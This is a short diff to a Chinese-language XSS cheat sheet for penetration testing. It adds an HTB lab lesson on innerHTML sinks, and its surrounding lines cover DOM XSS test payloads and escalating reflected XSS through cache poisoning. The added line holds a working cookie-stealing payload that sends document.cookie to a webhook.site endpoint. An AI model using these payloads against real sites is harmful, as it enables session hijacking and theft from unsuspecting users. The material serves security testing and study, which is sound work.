@@ -128,6 +128,8 @@ innerHTML / outerHTML / insertAdjacentHTML / document.write / $('...') / .html(.
 
 测试：`https://target/page.html#<img src=x onerror=alert(1)>`（改 hash）；`parent.postMessage('<img src=x onerror=alert(1)>','*')`（跨窗口）。
 
+> **sink 是 innerHTML 时的教训**（实战：HTB-OnlyHacks）：`innerHTML` 赋值里的 `<script>` 标签**不会执行**——换 `<img onerror>` 等事件型标签；外带用 `<img src=x onerror="fetch('https://webhook.site/<uuid>?c='+document.cookie)">`。
+
 ### 4.5 利用 / 升级链 `[Claude-BugHunter]`
 
 - **反射 XSS + 缓存投毒 → 持久化**：找可缓存响应 + unkeyed 输入（`X-Forwarded-Host`、`X-Original-URL`）注入 payload，所有 CDN 访客命中（Glassdoor 反射→存储，H1 #1424094）。
